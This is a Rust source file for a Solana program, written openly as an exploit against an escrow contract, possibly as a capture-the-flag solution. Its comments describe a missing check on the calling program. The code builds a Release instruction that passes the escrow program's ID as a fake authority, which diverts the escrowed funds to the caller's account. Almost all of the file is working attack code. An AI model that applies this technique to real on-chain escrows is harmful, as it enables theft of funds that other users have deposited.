use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    pubkey::Pubkey,
    instruction::{AccountMeta, Instruction},
};
use borsh::BorshSerialize;

#[derive(BorshSerialize)]
pub enum EscrowInstruction {
    Initialize { amount: u64 },
    Release,
    Cancel,
}

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    msg!("Exploit starting...");
    
    let account_info_iter = &mut accounts.iter();
    let user_account = next_account_info(account_info_iter)?;
    let escrow_program = next_account_info(account_info_iter)?;
    let escrow_pda = next_account_info(account_info_iter)?;
    
    msg!("User: {}", user_account.key);
    msg!("Escrow Program: {}", escrow_program.key);
    msg!("Escrow PDA: {}", escrow_pda.key);
    
    // Exploit: Call Release directly, passing the program ID as the authority
    // The vulnerability is that the program checks if the authority_program
    // account matches the stored program ID, but doesn't verify that we're
    // actually calling via CPI from that program. We can just pass the program
    // ID as a regular account!
    
    msg!("Calling Release instruction with program as fake authority...");
    
    let release_instruction = Instruction {
        program_id: *escrow_program.key,
        accounts: vec![
            AccountMeta::new(*escrow_pda.key, false),        // Escrow PDA
            AccountMeta::new(*user_account.key, false),      // Recipient (us)
            AccountMeta::new_readonly(*escrow_program.key, false), // Authority program (fake!)
        ],
        data: EscrowInstruction::Release.try_to_vec().unwrap(),
    };
    
    invoke(
        &release_instruction,
        &[
            escrow_pda.clone(),
            user_account.clone(),
            escrow_program.clone(),
        ],
    )?;
    
    msg!("Exploit successful! Funds released.");
    
    Ok(())
}
